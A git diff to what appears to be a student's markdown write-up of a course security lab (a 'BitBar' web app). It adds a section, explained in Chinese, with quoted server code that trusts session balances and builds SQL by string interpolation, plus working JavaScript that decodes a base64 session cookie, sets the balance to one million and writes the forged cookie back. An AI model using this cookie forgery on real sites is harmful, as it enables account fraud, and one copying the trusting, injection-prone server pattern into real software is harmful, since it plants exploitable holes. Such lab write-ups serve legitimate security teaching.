@@ -12,6 +12,7 @@
     + [Exploit Alpha Cookie Theft](#exploit-alpha-cookie-theft)
     + [Exploit Bravo Cross Site Request Forgery](#exploit-bravo-cross-site-request-forgery)
     + [Exploit Charlie Session Hijacking with Cookies](#exploit-charlie-session-hijacking-with-cookies)
+    + [Exploit Delta Cooking the Books with Cookies](#exploit-delta-cooking-the-books-with-cookies)
 
 # Proj1
 ## Target1 Buffer overflow
@@ -1228,4 +1229,26 @@ jsonObj.account.username = "user1";
 jsonObj.account.bitbars = 200
 var user1Cookie = JSON.stringify(jsonObj);
 document.cookie = "session=".concat(btoa(user1Cookie));
+```
+## Exploit Delta Cooking the Books with Cookies
+attacker给user1转账1块，然后attacker账户有一个million，方法和C完全相同，由于`transfer`过程中，BitBar数量是从session中获得，所以只要transfer一块就能把任意的数量的BitBar在数据库中固定
+```javascript
+    req.session.account.bitbars -= amount;
+    query = `UPDATE Users SET bitbars = "${req.session.account.bitbars}" WHERE username == "${req.session.account.username}";`;
+    await db.exec(query);
+```
+具体js如下所示
+```javascript
+function getCookie(name) {
+  var value = "; ".concat(document.cookie);
+  var parts = value.split("; ".concat(name).concat("="));
+  if (parts.length == 2) 
+    return parts.pop().split(";").shift();
+}
+var cookie = getCookie("session");
+var json = atob(cookie);
+var jsonObj = JSON.parse(json);
+jsonObj.account.bitbars = 1000000
+var attackerCookie = JSON.stringify(jsonObj);
+document.cookie = "session=".concat(btoa(attackerCookie));
 ```
